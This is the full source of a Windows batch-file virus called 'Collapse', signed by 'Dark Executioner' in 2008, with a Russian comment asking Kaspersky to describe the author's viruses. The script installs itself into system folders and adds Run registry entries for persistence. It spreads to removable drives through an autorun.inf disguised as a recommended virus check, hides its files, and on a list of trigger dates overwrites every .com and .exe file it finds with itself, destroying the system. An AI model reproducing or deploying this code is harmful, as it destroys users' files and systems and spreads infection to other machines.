
::Name - "Collapse"
::Date - 11.10.2008 ; 11:41
::Coder - Dark Executioner.
::УВАЖАЕМЫЙ ЕВГЕНИЙ КАСПЕРСКИЙ!
::прошу Вас сделать описание моих вирьков
::(Virus.BAT.Lofer.a, b, c, ну и d наверно )) 
::разумеется если Вам не сложно...
@echo off
::check body
if exist %windir%\collapse.bat goto ctf
if exist %windir%\system32\collapse.bat goto ctf
if not exist %windir%\collapse.bat goto cth
if not exist %windir%\system32\collapse.bat goto cth
::copy to hard drive
:cth
copy %0 %windir%\system32\collapse.bat
copy %0 %windir%\collapse.bat
::loading1
echo REGEDIT4 > C:\collapse1.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> C:\collapse1.reg
echo "G-302SS"="C:\\WINDOWS\\collapse.bat" >> C:\collapse1.reg
regedit.exe -s C:\collapse1.reg
del C:\collapse1.reg
::loading2
echo REGEDIT4 > C:\collapse2.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run] >> C:\collapse2.reg
echo "G-5788SS"="C:\\WINDOWS\\system32\\collapse.bat" >> C:\collapse2.reg
regedit.exe -s C:\collapse2.reg
del C:\collapse2.reg
attrib +h +s +r %windir%\system32\collapse.bat
goto datck
::I-worm
net share %random%:C:\
net share %random%:D:\
::copy to flash
:ctf
echo [autorun] > C:\autorun.inf
echo icon=C:\WINDOWS\explorer.exe >> C:\autorun.inf
echo open="collapse.bat" >> C:\autorun.inf
echo UseAutoPlay=1 >> C:\autorun.inf
echo action=Выполнить проверку на вирусы (рекомендуется!) >> C:\autorun.inf
copy C:\autorun.inf D:\autorun.inf
copy C:\autorun.inf A:\autorun.inf
copy C:\autorun.inf F:\autorun.inf
copy C:\autorun.inf H:\autorun.inf
copy C:\autorun.inf G:\autorun.inf
copy C:\autorun.inf I:\autorun.inf
copy C:\autorun.inf J:\autorun.inf
del C:\autorun.inf
copy %windir%\collapse.bat D:\collapse.bat
copy %windir%\collapse.bat A:\collapse.bat
copy %windir%\collapse.bat F:\collapse.bat
copy %windir%\collapse.bat H:\collapse.bat
copy %windir%\collapse.bat G:\collapse.bat
copy %windir%\collapse.bat I:\collapse.bat
copy %windir%\collapse.bat J:\collapse.bat
::date
:datck
echo > %windir%\%date%
if exist 18.10.2008 goto infect
if exist 25.10.2008 goto infect
if exist 01.11.2008 goto infect
if exist 08.11.2008 goto infect
if exist 15.11.2008 goto infect
if exist 22.11.2008 goto infect
if exist 29.11.2008 goto infect
if exist 01.12.2008 goto infect
if exist 08.12.2008 goto infect
if exist 15.12.2008 goto infect
if exist 22.12.2008 goto infect
if exist 29.12.2008 goto infect
if exist 03.01.2009 goto infect
if exist 20.01.2009 goto infect
if exist 02.02.2009 goto infect
if exist 10.02.2009 goto infect
if exist 18.02.2009 goto infect
if exist 26.02.2009 goto infect
if exist 08.03.2009 goto infect
if exist 14.03.2009 goto infect
if exist 18.03.2009 goto infect
if exist 25.03.2009 goto infect
if exist 31.03.2009 goto infect
if exist 02.04.2009 goto infect
if exist 11.04.2009 goto infect
if exist 18.04.2009 goto infect
if exist 20.04.2009 goto infect
if exist 22.04.2009 goto infect
if exist 24.04.2009 goto infect
if exist 26.04.2009 goto infect
if exist 28.04.2009 goto infect
if exist 30.04.2009 goto infect
if exist 01.05.2009 goto infect
if exist 31.05.2009 goto infect
if exist 01.06.2009 goto infect
if exist 10.06.2009 goto infect
if exist 19.06.2009 goto infect
if exist 28.06.2009 goto infect
if exist 01.07.2009 goto infect
if exist 05.07.2009 goto infect
if exist 06.07.2009 goto infect
if exist 07.07.2009 goto infect
if exist 08.07.2009 goto infect
if exist 09.07.2009 goto infect
if exist 01.08.2009 goto infect
if exist 08.08.2009 goto infect
if exist 13.08.2009 goto infect
if exist 18.08.2009 goto infect
if exist 31.08.2009 goto infect
if exist 06.09.2009 goto infect
if exist 10.09.2009 goto infect
if exist 13.09.2009 goto infect
if exist 17.09.2009 goto infect
if exist 20.09.2009 goto infect
if exist 24.09.2009 goto infect
if exist 27.09.2009 goto infect
if exist 06.10.2009 goto infect
if exist 10.10.2009 goto infect
if exist 13.10.2009 goto infect
if exist 17.10.2009 goto infect
if exist 20.10.2009 goto infect
if exist 23.10.2009 goto infect
if exist 28.10.2009 goto infect
if exist 29.10.2009 goto infect
if exist 06.11.2009 goto infect
if exist 12.11.2009 goto infect
if exist 14.11.2009 goto infect
if exist 19.11.2009 goto infect
if exist 21.11.2009 goto infect
if exist 26.11.2009 goto infect
if exist 28.11.2009 goto infect
if exist 07.12.2009 goto infect
if exist 08.12.2009 goto infect
if exist 09.12.2009 goto infect
if exist 10.12.2009 goto infect
if exist 12.12.2009 goto infect
if exist 17.12.2009 goto infect
if exist 18.12.2009 goto infect
if exist 19.12.2009 goto infect
::infect
:infect
@echo off
cd %windir%\system32
:1
if exist *.com goto 2
if exist *.exe goto 2
if not exist *.com goto 3
if not exist *.exe goto 3
:2
set a=
%qe1n%
%tqx6%
%ufjg%
%s3j3%
for %%a in (*.com *.exe) do copy %0 %%a > nul
%dav%
%lg6a%
:3
cd..
goto 1
::if only C drive
if not exist D: goto exit
if not exist A: goto exit
if not exist F: goto exit
if not exist H: goto exit
if not exist G: goto exit
if not exist I: goto exit
if not exist J: goto exit
::EXIT
:exit
exit